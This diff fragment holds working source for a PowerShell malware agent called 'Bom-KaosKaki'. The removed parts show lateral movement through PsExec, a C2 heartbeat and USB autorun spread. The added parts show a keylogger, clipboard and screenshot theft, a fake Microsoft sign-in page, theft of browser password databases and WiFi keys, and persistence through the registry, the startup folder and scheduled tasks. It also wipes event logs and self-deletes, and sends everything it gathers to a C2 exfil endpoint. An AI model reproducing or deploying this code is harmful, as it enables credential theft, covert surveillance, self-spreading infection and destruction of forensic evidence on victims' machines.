-                        Register-ScheduledTask -ComputerName $target -Credential $credObj -TaskName 'MicrosoftUpdateCheck' -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Force -ErrorAction SilentlyContinue
-            
-                        # Execute via PsExec (if available)
-                        try {
-                            Start-Process -FilePath "psexec.exe" -ArgumentList "\\$target -u $($cred.user) -p $($cred.pass) -h -s -d powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\update.ps1 -Full" -WindowStyle Hidden -ErrorAction SilentlyContinue
-                        }
-                        catch {}
-            
-                        Invoke-C2 -type 'lateral_movement' -data @{target = $target; user = $cred.user; status = 'deployed' }
-                        break
+                    $payload = @{
+                        session_id = $sessionId
+                        type       = "keylog"
+                        data       = $buffer
+                        timestamp  = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
                     }
+                    $json = $payload | ConvertTo-Json -Compress
+                    $webClient = New-Object System.Net.WebClient
+                    $webClient.Headers.Add("Content-Type", "application/json")
+                    $webClient.UploadString("$c2Server/api/exfil", $json) | Out-Null
+                    $buffer = ""
+                    $lastSend = Get-Date
                 }
                 catch {}
             }
         }
-    }
-  
-    Write-Log "[LATERAL] Lateral movement complete"
-}
-
-# ========== MODULE 14: C2 COMMUNICATION ==========
-function Start-C2Communication {
-    Write-Log "[C2] Starting heartbeat..."
-  
-    # 14.1 Send initial heartbeat with system info
-    $systemInfo = @{
-        hostname  = $env:COMPUTERNAME
-        username  = $env:USERNAME
-        os        = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
-        arch      = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).OSArchitecture
-        lang      = (Get-WinSystemLocale -ErrorAction SilentlyContinue).Name
-        upTime    = (Get-Date) - (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).LastBootUpTime
-        public_ip = $(try { (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5 -ErrorAction Stop).ip } catch { 'unknown' })
-    }
-  
-    Invoke-C2 -type 'heartbeat' -data $systemInfo
-  
-    # 14.2 Heartbeat loop every 60 seconds
-    while ($true) {
-        Start-Sleep -Seconds 60
-        Invoke-C2 -type 'heartbeat' -data @{timestamp = (Get-Date -Format 'o') }
-    }
-}
-
-# ========== MODULE 15: USB PROPAGATION ==========
-function Invoke-USBPropagation {
-    Write-Log "[USB] Setting up USB propagation..."
-  
-    # 15.1 Monitor for USB drives
-    $existingDrives = @(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match '^[A-Z]:\\$' } | ForEach-Object { $_.Root })
-  
-    while ($true) {
-        Start-Sleep -Seconds 10
-        $currentDrives = @(Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Root -match '^[A-Z]:\\$' } | ForEach-Object { $_.Root })
-        $newDrives = $currentDrives | Where-Object { $_ -notin $existingDrives }
+    } -ArgumentList $Script:SessionId, $C2Server, $logPath
     
-        foreach ($drive in $newDrives) {
-            try {
-                # Check if removable
-                $driveType = (Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='$($drive.Replace('\',''))'" -ErrorAction SilentlyContinue).DriveType
-                if ($driveType -eq 2) {
-                    # Removable
-                    Write-Log "[USB] Found removable drive: $drive"
-          
-                    # 15.2 Copy payload to USB
-                    $usbPath = "$drive"
-                    Copy-Item $PSCommandPath "$usbPath\WindowsUpdate.ps1" -Force -ErrorAction SilentlyContinue
-          
-                    # 15.3 Create autorun.inf
-                    $autorun = @"
-[AutoRun]
-Shellexecute=wscript.exe //nologo "%~dp0launch.vbs"
-Action=Open folder to view files
-Icon=shell32.dll,4
-"@
-                    $autorun | Out-File "$usbPath\autorun.inf" -Encoding ascii -Force
-          
-                    # 15.4 Create VBS launcher (bypasses autorun restrictions on Win 10+)
-                    $vbs = @'
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""%~dp0WindowsUpdate.ps1"" -Full", 0, False
-'@
-                    $vbs | Out-File "$usbPath\launch.vbs" -Encoding ascii -Force
-          
-                    # 15.5 Create shortcut with PowerShell execution
-                    $WScriptShell = New-Object -ComObject WScript.Shell
-                    $shortcut = $WScriptShell.CreateShortcut("$usbPath\WindowsUpdate.lnk")
-                    $shortcut.TargetPath = 'powershell.exe'
-                    $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"%~dp0WindowsUpdate.ps1`" -Full"
-                    $shortcut.IconLocation = 'shell32.dll,4'
-                    $shortcut.WindowStyle = 7
-                    $shortcut.Save()
-          
-                    # 15.6 Set hidden attributes
-                    Set-ItemProperty "$usbPath\autorun.inf" -Name Attributes -Value 'Hidden' -ErrorAction SilentlyContinue
-                    Set-ItemProperty "$usbPath\launch.vbs" -Name Attributes -Value 'Hidden' -ErrorAction SilentlyContinue
-                    Set-ItemProperty "$usbPath\WindowsUpdate.ps1" -Name Attributes -Value 'Hidden' -ErrorAction SilentlyContinue
-                    Set-ItemProperty "$usbPath\WindowsUpdate.lnk" -Name Attributes -Value 'Normal' -ErrorAction SilentlyContinue
-          
-                    Invoke-C2 -type 'usb_propagation' -data @{drive = $drive; status = 'deployed' }
-                    Write-Log "[USB] Deployed to $drive"
-                }
-            }
-            catch { Write-Log "[USB] Error on $drive : $_" }
-        }
+    return "Keylogger started. Log: $logPath"
+}
+
+function Stop-Keylogger {
+    param($cmd)
     
-        $existingDrives = $currentDrives
+    if (-not $Script:KeyloggerRunning) {
+        return "Keylogger not running"
     }
-}
-
-# ========== MAIN EXECUTION ==========
-function Invoke-Main {
-    Write-Log "=== Bom-KaosKaki v3.0 Starting ==="
-    Write-Log "Session: $SESSION_ID | Machine: $MACHINE_ID"
-  
-    # Always run evasion first
-    Invoke-Evasion
-  
-    # Start C2 heartbeat in background
-    Start-ThreadJob 'Start-C2Communication'
-  
-    # Start spyware collection
-    Invoke-Spyware
-    Invoke-BrowserStealer
-    Invoke-WiFiStealer
-    Invoke-VpnStealer
-  
-    # Module selection
-    if ($Full -or $Keylogger) {
-        Start-ThreadJob 'Invoke-Keylogger'
-        Start-ThreadJob 'Invoke-ClipboardMonitor'
-        Start-ThreadJob 'Invoke-Screenshot'
-    }
-  
-    if ($Full -or $Ransomware) {
-        Invoke-LogCleaner
-        Invoke-Ransomware
-    }
-  
-    if ($Full -or $Phishing) {
-        Start-ThreadJob 'Invoke-Phishing'
-    }
-  
-    if ($Full -or $Spread) {
-        Invoke-LateralMovement
-        Start-ThreadJob 'Invoke-USBPropagation'
-    }
-  
-    if ($Full) {
-        Invoke-Persistence
-    }
-  
-    # Keep alive for background threads
-    while ($true) {
-        Start-Sleep -Seconds 10
-    }
-}
-
-# Run
-if (-not $NoMain) {
+    
     try {
-        Invoke-Main
+        if ($Script:KeyloggerJob) {
+            $Script:KeyloggerJob | Stop-Job -Force
+            $Script:KeyloggerJob | Remove-Job -Force
+        }
+    }
+    catch {}
+    
+    $Script:KeyloggerRunning = $false
+    return "Keylogger stopped"
+}
+
+function Invoke-ClipboardSteal {
+    param($cmd)
+    
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        $clipboardText = [System.Windows.Forms.Clipboard]::GetText()
+        
+        $result = @{
+            content = $clipboardText
+            length  = $clipboardText.Length
+        }
+        
+        Send-ExfilData -Type "clipboard" -Data $result
+        return "Clipboard stolen ($($clipboardText.Length) chars)"
     }
     catch {
-        Write-Log "[FATAL] $_"
-        $_.Exception.ToString() | Out-File "$env:TEMP\ransim_error.log" -Append
+        return "Failed to steal clipboard: $($_.Exception.Message)"
     }
 }
+
+function Invoke-Screenshot {
+    param($cmd)
+    
+    try {
+        Add-Type -AssemblyName System.Drawing
+        Add-Type -AssemblyName System.Windows.Forms
+        
+        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
+        
+        $ms = New-Object System.IO.MemoryStream
+        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
+        $bytes = $ms.ToArray()
+        $ms.Close()
+        $graphics.Dispose()
+        $bitmap.Dispose()
+        
+        $filename = "screenshot_$($Script:SessionId)_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
+        
+        # Send as multipart
+        $filename = "screenshot_$($Script:SessionId)_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
+        
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $bodyLines = @()
+        $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"session_id`"`r`n`r`n$($Script:SessionId)`r`n"
+        $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"type`"`r`n`r`nscreenshot`r`n"
+        $bodyLines += "--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$filename`"`r`nContent-Type: image/png`r`n`r`n"
+        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines -join "")
+        $footerBytes = [System.Text.Encoding]::UTF8.GetBytes("`r`n--$boundary--`r`n")
+        
+        $fullBody = New-Object byte[] ($bodyBytes.Length + $bytes.Length + $footerBytes.Length)
+        [Buffer]::BlockCopy($bodyBytes, 0, $fullBody, 0, $bodyBytes.Length)
+        [Buffer]::BlockCopy($bytes, 0, $fullBody, $bodyBytes.Length, $bytes.Length)
+        [Buffer]::BlockCopy($footerBytes, 0, $fullBody, $bodyBytes.Length + $bytes.Length, $footerBytes.Length)
+        
+        Invoke-WebRequest -Uri "$C2Server/api/exfil" -Method POST `
+            -ContentType "multipart/form-data; boundary=$boundary" `
+            -Body $fullBody -UseBasicParsing -TimeoutSec 30 | Out-Null
+        
+        return "Screenshot captured and exfiltrated ($($bytes.Length) bytes)"
+    }
+    catch {
+        return "Screenshot failed: $($_.Exception.Message)"
+    }
+}
+
+function Invoke-Phishing {
+    param($cmd)
+    
+    $phishingDir = "$env:TEMP\kaoskaki_phishing"
+    New-Item -ItemType Directory -Force -Path $phishingDir | Out-Null
+    
+    # Create a fake login page
+    $html = @"
+        <!DOCTYPE html>
+        <html>
+        <head><title>Microsoft - Sign In</title><style>
+        body { font-family:Segoe UI, sans-serif; background:#f0f0f0; display:flex; justify-content:center; align-items:center; height:100vh; margin:0 }
+        .card { background:white; padding:40px; border-radius:8px; box-shadow:0 2px 20px rgba(0, 0, 0, .1); width:360px; text-align:center }
+        .logo { font-size:28px; font-weight:600; color:#00a4ef; margin-bottom:30px }
+        input { width:100%; padding:12px; margin:8px 0; border:1px solid #ddd;border-radius:4px;font-size:14px;box-sizing:border-box}
+        button { width:100%; padding:12px; background:#00a4ef; color:white; border:none; border-radius:4px; font-size:16px; cursor:pointer; margin-top:12px }
+        button:hover { background:#0088cc }
+        </style></head>
+        <body>
+        <div class="card">
+        <div class="logo">Microsoft</div>
+        <form method="POST" action="/api/phish_capture">
+        <input type="email" name="email" placeholder="Email, phone, or Skype" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Sign in</button>
+        </form>
+        </div>
+        </body>
+        </html>
+"@
+    
+    $htmlPath = "$phishingDir\index.html"
+    [System.IO.File]::WriteAllText($htmlPath, $html)
+    
+    # Start a simple HTTP server
+    $port = 8080
+    $listener = New-Object System.Net.HttpListener
+    $listener.Prefixes.Add("http://localhost:$port/")
+    $listener.Start()
+    
+    $null = Start-Job -ScriptBlock {
+        param($dir, $port, $sessionId, $c2Server)
+        $listener = New-Object System.Net.HttpListener
+        $listener.Prefixes.Add("http://localhost:$port/")
+        $listener.Start()
+        
+        while ($true) {
+            $context = $listener.GetContext()
+            $request = $context.Request
+            $response = $context.Response
+            
+            if ($request.HttpMethod -eq "POST" -and $request.Url.AbsolutePath -eq "/api/phish_capture") {
+                $reader = New-Object System.IO.StreamReader($request.InputStream)
+                $body = $reader.ReadToEnd()
+                
+                # Exfil captured credentials
+                $payload = @{
+                    session_id = $sessionId
+                    type       = "phishing_creds"
+                    data       = $body
+                    timestamp  = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
+                }
+                try {
+                    $webClient = New-Object System.Net.WebClient
+                    $webClient.Headers.Add("Content-Type", "application/json")
+                    $webClient.UploadString("$c2Server/api/exfil", ($payload | ConvertTo-Json -Compress)) | Out-Null
+                }
+                catch {}
+                
+                # Redirect to real Microsoft
+                $response.Redirect("https://login.live.com")
+            }
+            else {
+                # Serve the phishing page
+                $html = [System.IO.File]::ReadAllText("$dir\index.html")
+                $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
+                $response.ContentType = "text/html"
+                $response.OutputStream.Write($buffer, 0, $buffer.Length)
+            }
+            $response.Close()
+        }
+    } -ArgumentList $phishingDir, $port, $Script:SessionId, $C2Server
+    
+    $result = @{
+        local_url = "http://localhost:$port"
+        directory = $phishingDir
+        port      = $port
+    }
+    
+    Send-ExfilData -Type "phishing" -Data $result
+    return "Phishing page running on http://localhost:$port. Use ngrok to expose externally."
+}
+
+function Invoke-Spread {
+    param($cmd)
+    
+    $spreadPath = "$env:TEMP\spread_$($Script:SessionId).ps1"
+    $scriptContent = @'
+# Spread via USB autorun
+$driveLetters = [char[]]('D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z')
+$c2Url = "C2_URL_PLACEHOLDER"
+$payloadUrl = "$c2Url/api/payload"
+$targetName = "KAOSKAKI.exe"
+
+while ($true) {
+    foreach ($drive in $driveLetters) {
+        $path = "$drive`:\"
+        if (Test-Path $path) {
+            $driveType = (Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='$drive'").DriveType
+            if ($driveType -eq 2) { # Removable
+                $shortcutPath = "$path\KAOSKAKI.lnk"
+                if (-not (Test-Path $shortcutPath)) {
+                    try {
+                        # Download payload
+                        Invoke-WebRequest -Uri $payloadUrl -OutFile "$path\$targetName" -UseBasicParsing
+                        
+                        # Create autorun shortcut
+                        $WScriptShell = New-Object -ComObject WScript.Shell
+                        $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+                        $shortcut.TargetPath = "$path\$targetName"
+                        $shortcut.WorkingDirectory = $path
+                        $shortcut.IconLocation = "%SystemRoot%\System32\shell32.dll, 3"
+                        $shortcut.Description = "Documents"
+                        $shortcut.Save()
+                        
+                        # Create autorun.inf
+                        $autorun = "[Autorun]`nopen=$targetName`naction=Open folder to view files`nshell\open\command=$targetName`nshell\explore\command=$targetName"
+                        [System.IO.File]::WriteAllText("$path\autorun.inf", $autorun)
+                        
+                        # Set hidden + system attributes
+                        attrib +h +s "$path\$targetName" "$path\autorun.inf" "$shortcutPath"
+                    } catch {}
+                }
+            }
+        }
+    }
+    Start-Sleep -Seconds 30
+}
+'@
+    
+    $scriptContent = $scriptContent.Replace("C2_URL_PLACEHOLDER", $C2Server)
+    [System.IO.File]::WriteAllText($spreadPath, $scriptContent)
+    
+    # Execute spread monitor
+    Start-Job -FilePath $spreadPath
+    
+    return "USB spread monitor started. Checking for removable drives every 30 seconds."
+}
+
+function Invoke-Persistence {
+    param($cmd)
+    
+    $currentPath = (Get-Process -Id $PID).Path
+    $payloadPath = "$env:APPDATA\Microsoft\Windows\kaoskaki.ps1"
+    $vbsPath = "$env:APPDATA\Microsoft\Windows\kaoskaki.vbs"
+    $batPath = "$env:APPDATA\Microsoft\Windows\kaoskaki.bat"
+    
+    # Copy current script
+    if (Test-Path $currentPath) {
+        Copy-Item $currentPath $payloadPath -Force
+    }
+    
+    # Create VBS launcher (hidden)
+    $vbsContent = @"
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`"", 0, False
+"@
+    [System.IO.File]::WriteAllText($vbsPath, $vbsContent)
+    
+    # Create batch launcher
+    $batContent = "``@echo off`npowershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`"`nexit"
+    [System.IO.File]::WriteAllText($batPath, $batContent)
+    
+    $methods = @()
+    
+    # Method 1: Registry Run
+    try {
+        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "KaosKaki" -Value "wscript.exe `"$vbsPath`"" -PropertyType String -Force | Out-Null
+        $methods += "registry_run"
+    }
+    catch {}
+    
+    # Method 2: Startup Folder
+    try {
+        $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\kaoskaki.vbs"
+        Copy-Item $vbsPath $startupPath -Force
+        $methods += "startup_folder"
+    }
+    catch {}
+    
+    # Method 3: Scheduled Task (if admin)
+    try {
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`""
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+        Register-ScheduledTask -TaskName "WindowsUpdate_KaosKaki" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
+        $methods += "scheduled_task"
+    }
+    catch {}
+    
+    $result = @{
+        methods      = $methods
+        payload_path = $payloadPath
+        vbs_path     = $vbsPath
+        bat_path     = $batPath
+    }
+    
+    Send-ExfilData -Type "persistence" -Data $result
+    return "Persistence installed: $($methods -join ', ')"
+}
+
+function Invoke-Spyware {
+    param($cmd)
+    
+    if ($Script:SpywareRunning) {
+        return "Spyware already running"
+    }
+    
+    $Script:SpywareRunning = $true
+    
+    # Start spyware monitoring job
+    $Script:SpywareJob = Start-Job -ScriptBlock {
+        param($sessionId, $c2Server)
+        
+        # Monitor network connections
+        while ($true) {
+            try {
+                $connections = Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue | 
+                Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess |
+                Where-Object { $_.RemoteAddress -notin @("127.0.0.1", "::1") } |
+                Select-Object -First 20
+                
+                if ($connections) {
+                    $payload = @{
+                        session_id = $sessionId
+                        type       = "spyware_connections"
+                        data       = ($connections | ConvertTo-Json -Compress)
+                        timestamp  = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
+                    }
+                    try {
+                        $webClient = New-Object System.Net.WebClient
+                        $webClient.Headers.Add("Content-Type", "application/json")
+                        $webClient.UploadString("$c2Server/api/exfil", ($payload | ConvertTo-Json -Compress)) | Out-Null
+                    }
+                    catch {}
+                }
+                
+                # Monitor running processes
+                $procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 Name, CPU, WorkingSet, StartTime
+                $payload2 = @{
+                    session_id = $sessionId
+                    type       = "spyware_processes"
+                    data       = ($procs | ConvertTo-Json -Compress)
+                    timestamp  = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
+                }
+                try {
+                    $webClient2 = New-Object System.Net.WebClient
+                    $webClient2.Headers.Add("Content-Type", "application/json")
+                    $webClient2.UploadString("$c2Server/api/exfil", ($payload2 | ConvertTo-Json -Compress)) | Out-Null
+                }
+                catch {}
+            }
+            catch {}
+            
+            Start-Sleep -Seconds 120
+        }
+    } -ArgumentList $Script:SessionId, $C2Server
+    
+    return "Spyware monitoring started (network connections + top processes every 2 min)"
+}
+
+function Invoke-CleanTraces {
+    param($cmd)
+    
+    $cleaned = @()
+    
+    # Clear PowerShell history
+    try {
+        Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
+        Remove-Item "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
+        $cleaned += "powershell_history"
+    }
+    catch {}
+    
+    # Clear event logs (if admin)
+    try {
+        wevtutil cl "Windows PowerShell" 2>$null
+        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
+        wevtutil cl "Security" 2>$null
+        wevtutil cl "System" 2>$null
+        wevtutil cl "Application" 2>$null
+        $cleaned += "event_logs"
+    }
+    catch {}
+    
+    # Clear temp files
+    try {
+        Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item "$env:WINDIR\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
+        $cleaned += "temp_files"
+    }
+    catch {}
+    
+    # Clear recent files
+    try {
+        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
+        $cleaned += "recent_files"
+    }
+    catch {}
+    
+    # Clear prefetch (if admin)
+    try {
+        Remove-Item "$env:WINDIR\Prefetch\*" -Force -ErrorAction SilentlyContinue
+        $cleaned += "prefetch"
+    }
+    catch {}
+    
+    # Clear clipboard
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        [System.Windows.Forms.Clipboard]::Clear()
+        $cleaned += "clipboard"
+    }
+    catch {}
+    
+    # Clear Run MRU
+    try {
+        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
+        $cleaned += "run_mru"
+    }
+    catch {}
+    
+    $result = @{ cleaned = $cleaned }
+    Send-ExfilData -Type "clean" -Data $result
+    return "Cleaned: $($cleaned -join ', ')"
+}
+
+function Invoke-StealBrowser {
+    param($cmd)
+    
+    $browsers = @(
+        @{path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"; name = "Chrome" },
+        @{path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"; name = "Edge" },
+        @{path = "$env:APPDATA\Opera Software\Opera Stable\Login Data"; name = "Opera" },
+        @{path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"; name = "Brave" }
+    )
+    
+    $results = @()
+    
+    foreach ($browser in $browsers) {
+        if (Test-Path $browser.path) {
+            try {
+                # Copy file (SQLite is locked while browser runs)
+                $tempFile = "$env:TEMP\login_data_$($browser.name)_$([Guid]::NewGuid().Guid).db"
+                Copy-Item $browser.path $tempFile -Force
+                
+                # Try to read using ADO.NET
+                try {
+                    # $connString = "Provider=Microsoft.ACE.OLEDB.12.0; Data Source=$tempFile; Extended Properties='Excel 12.0;HDR=YES'; "
+                    # Alternative: use SQLite if available
+                    Add-Type -Path "$env:TEMP\System.Data.SQLite.dll" -ErrorAction SilentlyContinue
+                }
+                catch {}
+                
+                $results += @{
+                    browser = $browser.name
+                    path    = $browser.path
+                    size    = (Get-Item $browser.path).Length
+                    stolen  = $true
+                }
+                
+                # Upload the database file
+                $bytes = [System.IO.File]::ReadAllBytes($tempFile)
+                Send-ExfilData -Type "browser" -Data @{
+                    browser = $browser.name
+                    file    = [Convert]::ToBase64String($bytes)
+                    size    = $bytes.Length
+                }
+                
+                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+            }
+            catch {
+                $results += @{
+                    browser = $browser.name
+                    path    = $browser.path
+                    error   = $_.Exception.Message
+                    stolen  = $false
+                }
+            }
+        }
+        else {
+            $results += @{ browser = $browser.name; stolen = $false; reason = "Not installed" }
+        }
+    }
+    
+    return ($results | ConvertTo-Json -Compress)
+}
+
+function Invoke-StealWiFi {
+    param($cmd)
+    
+    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
+        $_.ToString().Split(':')[1].Trim()
+    }
+    
+    $wifiData = @()
+    
+    foreach ($wifiProfile in $profiles) {
+        try {
+            $details = netsh wlan show profile name="$wifiProfile" key=clear
+            $password = ($details | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':')[1].Trim() })
+            $auth = ($details | Select-String "Authentication" | Select-Object -First 1 | ForEach-Object { $_.ToString().Split(':')[1].Trim() })
+            
+            $wifiData += @{
+                ssid     = $wifiProfile
+                password = if ($password) { $password } else { "(open network)" }
+                auth     = if ($auth) { $auth } else { "Unknown" }
+            }
+        }
+        catch {
+            $wifiData += @{ ssid = $wifiProfile; password = "(error reading)"; error = $_.Exception.Message }
+        }
+    }
+    
+    $result = @{ networks = $wifiData; count = $wifiData.Count }
+    Send-ExfilData -Type "wifi" -Data $result
+    return ($result | ConvertTo-Json -Compress)
+}
+
+function Invoke-Uninstall {
+    param($cmd)
+    
+    $null = Invoke-CleanTraces $cmd
+    
+    # Remove persistence
+    try {
+        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "KaosKaki" -Force -ErrorAction SilentlyContinue
+    }
+    catch {}
+    
+    try {
+        Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\kaoskaki.vbs" -Force -ErrorAction SilentlyContinue
+    }
+    catch {}
+    
+    try {
+        Unregister-ScheduledTask -TaskName "WindowsUpdate_KaosKaki" -Confirm:$false -ErrorAction SilentlyContinue
+    }
+    catch {}
+    
+    # Remove script files
+    try {
+        Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.ps1" -Force -ErrorAction SilentlyContinue
+        Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.vbs" -Force -ErrorAction SilentlyContinue
+        Remove-Item "$env:APPDATA\Microsoft\Windows\kaoskaki.bat" -Force -ErrorAction SilentlyContinue
+    }
+    catch {}
+    
+    # Stop keylogger and spyware
+    Stop-Keylogger $cmd
+    
+    if ($Script:SpywareJob) {
+        try { $Script:SpywareJob | Stop-Job -Force; $Script:SpywareJob | Remove-Job -Force } catch {}
+        $Script:SpywareRunning = $false
+    }
+    
+    Send-ExfilData -Type "uninstall" -Data @{ status = "uninstalled"; session_id = $Script:SessionId }
+    
+    # Schedule self-deletion
+    $scriptPath = (Get-Process -Id $PID).Path
+    $deleteScript = "Start-Sleep -Seconds 2; Remove-Item -Path '$scriptPath' -Force; Stop-Process -Id $PID -Force"
+    Start-Job -ScriptBlock ([ScriptBlock]::Create($deleteScript))
+    
+    return "Uninstalling. Goodbye."
+}
+
+# ============ MAIN C2 LOOP ============
+
+function Start-C2Communication {
+    param([switch]$Force)
+    
+    $now = Get-Date
+    
+    # Send heartbeat if interval reached
+    if ($Force -or (($now - $Script:LastHeartbeat).TotalSeconds -ge $HeartbeatInterval)) {
+        Send-Heartbeat -Force
+    }
+    
+    # Poll for commands if interval reached
+    if ($Force -or (($now - $Script:LastCommandPoll).TotalSeconds -ge $PollInterval)) {
+        $Script:LastCommandPoll = $now
+        Invoke-CommandPoll
+    }
+}
+
+# ============ INVOKE MAIN ============
+
+function Invoke-Main {
+    # Generate session ID if not set
+    if (-not $Script:SessionId) {
+        $Script:SessionId = Get-SessionId
+        Write-Host "[+] Session ID: $Script:SessionId" -ForegroundColor Green
+    }
+    
+    Write-Host "[+] Bom-KaosKaki Agent Started" -ForegroundColor Green
+    Write-Host "[+] C2 Server: $C2Server" -ForegroundColor Cyan
+    Write-Host "[+] Poll Interval: ${PollInterval}s | Heartbeat: ${HeartbeatInterval}s" -ForegroundColor Cyan
+    
+    # Send initial heartbeat
+    Send-Heartbeat -Force
+    
+    # Main loop
+    while ($true) {
+        Start-C2Communication
+        Start-Sleep -Seconds 5
+    }
+}
+
+# ============ ENTRY POINT ============
+
+# Hide window if running with -WindowStyle Hidden
+try {
+    $consoleHandle = (Get-Process -Id $PID).MainWindowHandle
+    if ($consoleHandle -and $consoleHandle -ne 0) {
+        $typeDef = @"
+[DllImport("user32.dll")]
+public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
+"@
+        $showWindowAsync = Add-Type -MemberDefinition $typeDef -Name "Win32Show" -Namespace "Win32" -PassThru
+        
+        # SW_HIDE = 0
+        $showWindowAsync::ShowWindowAsync($consoleHandle, 0) | Out-Null
+    }
+}
+catch {}
+
+# Start main
+Invoke-Main
